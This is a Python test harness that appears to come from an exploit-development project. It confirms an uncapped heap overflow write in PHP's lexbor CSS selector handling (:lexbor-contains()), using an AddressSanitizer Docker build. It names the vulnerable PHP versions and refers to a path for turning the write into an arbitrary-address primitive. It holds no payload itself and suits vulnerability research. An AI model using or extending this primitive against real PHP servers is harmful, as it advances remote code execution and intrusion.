#!/usr/bin/env python3
"""Green harness for the lexbor :lexbor-contains() far-reach heap WRITE primitive
(lexbor_farreach_write.py), using the ASan image php2shell-lexbor-asan:latest.

Checks the far-reach forward write:
  (1) the memcpy WRITE size tracks the attacker length exactly (== len+1), with no
      tokenizer cap, across 4096 / 20000 / 524288 / 4194304 (4 MiB);
  (2) the overflow is "located 0 bytes after" the mraw chunk region -> the write
      starts at the chunk end and runs forward (contiguous linear overflow);
  (3) lengths past 16384 write forward to a reach bounded only by mapped memory;
  (4) sanity: a 12-byte argument fits the 16-byte slot -> no overflow.

Version boundary (source-grounded): 8.4.26 VULN, 8.5.11 VULN, 8.5.12 FIXED.
Run (no compose lab; auto-builds/reuses php2shell-lexbor-asan from lab/lexbor):
    python3 -I poc/primitives/write/verify_lexbor_farreach_write.py
"""
import subprocess, sys, pathlib, re

# repo root is four levels up: .../poc/primitives/write/<file>
ROOT = pathlib.Path(__file__).resolve().parents[3]
LAB = ROOT / "lab" / "lexbor"
IMAGE = "php2shell-lexbor-asan:latest"
FRAME = "lxb_css_selectors_state_pseudo_class_function_lexbor_contains"
FORWARD_CAP = 16384
ASAN_SIG = "AddressSanitizer: heap-buffer-overflow"

_WRITE_RE = re.compile(r"WRITE of size (\d+) at (0x[0-9a-f]+)")
_REGION_RE = re.compile(r"located (\d+) bytes after (\d+)-byte region")


def ensure_image():
    r = subprocess.run(["docker", "images", "-q", IMAGE], capture_output=True, text=True)
    if r.stdout.strip():
        return True
    print(f"[*] building {IMAGE} (ASan PHP 8.4.26 + ext/dom/lexbor) ...")
    b = subprocess.run(["docker", "build", "-f", str(LAB / "Dockerfile"),
                        "-t", IMAGE, str(ROOT)], text=True)
    return b.returncode == 0


def run(length, timeout=150):
    cmd = ["docker", "run", "--rm", "-v", f"{LAB}:/work:ro",
           "-e", "ASAN_OPTIONS=detect_leaks=0:abort_on_error=0:exitcode=99",
           "-e", "USE_ZEND_ALLOC=0", "-e", "USE_TRACKED_ALLOC=1",
           IMAGE, "php", "-n", "/work/lexbor_overflow.php", str(length)]
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    return (p.stdout or "") + (p.stderr or "")


def main():
    if not ensure_image():
        print("[-] image build failed"); sys.exit(2)
    ok = True

    print("[*] far-reach WRITE: size must equal attacker len+1, uncapped, at chunk end")
    print(f"    (var_hash_rw forward wall = {FORWARD_CAP} bytes = 253*64)\n")
    for L in (4096, 20000, 524288, 4194304):
        out = run(L)
        wm = _WRITE_RE.search(out); rm = _REGION_RE.search(out)
        frame = FRAME in out
        ws = int(wm.group(1)) if wm else None
        loc = int(rm.group(1)) if rm else None
        reg = int(rm.group(2)) if rm else None
        scales = (ws == L + 1)
        chunk_end = (loc == 0)
        beyond = (ws is not None and ws > FORWARD_CAP)
        marker = "beyond-var_hash_rw" if beyond else "within-16KiB"
        print(f"    len={L:<9} WRITE_of_size={ws}  located_after={loc}B  region={reg}B  "
              f"frame={'ok' if frame else 'MISS'}  size==len+1:{scales}  [{marker}]")
        if not (frame and scales and chunk_end):
            print(f"      [-] expected frame={FRAME}, size=={L+1}, located_after=0"); ok = False
        if L + 1 > FORWARD_CAP and not beyond:
            print("      [-] expected write beyond the var_hash_rw cap"); ok = False

    print("\n[*] boundary control: 12-byte argument fits the 16-byte slot -> no overflow")
    out2 = run(12)
    clean = ASAN_SIG not in out2
    print(f"    no_overflow={clean}")
    if not clean:
        print("      [-] 12-byte control unexpectedly overflowed"); ok = False

    print()
    if ok:
        print("[+] PASS: attacker-controlled, UNCAPPED forward write size (to 4 MiB),")
        print("    origin at the mraw chunk end, exceeding the var_hash_rw 16 KiB wall by construction.")
        print("    => FAR-REACH write primitive CONFIRMED (linear/relative; see lexbor_farreach_write.py")
        print("       docstring for the arbitrary-address upgrade path and content constraints).")
        sys.exit(0)
    print("[-] FAIL")
    sys.exit(1)


if __name__ == "__main__":
    main()
